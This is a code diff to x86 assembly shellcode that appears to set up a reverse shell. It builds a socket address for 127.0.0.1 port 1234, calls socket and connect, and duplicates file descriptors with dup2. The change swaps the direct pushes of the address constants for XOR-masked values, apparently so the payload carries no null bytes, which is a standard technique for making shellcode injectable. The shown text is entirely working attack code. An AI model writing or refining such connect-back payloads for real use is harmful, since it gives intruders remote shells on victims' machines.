@@ -3,8 +3,16 @@
 
 
 _start:
-  push $0x0100007f
-  push $0xd2040002
+
+#  push $0x0100007f
+#  push $0xd2040002
+  mov $0x0100007f ^ 0x11111111, %eax
+  xor $0x11111111, %eax
+  push %eax
+  mov $0xd2040002 ^ 0x11111111, %eax
+  xor $0x11111111, %eax
+  push %eax
+  
   mov %esp, %esi
 
 socket:
@@ -33,7 +41,7 @@ connect_test:
   xor %ecx, %ecx #int newfd
   cmp %ecx, %eax
   jnz exit
-  
+
 dup2:
   xor %eax, %eax
   movb $0x3f, %al # sys_dup2(int oldfd, int newfd)
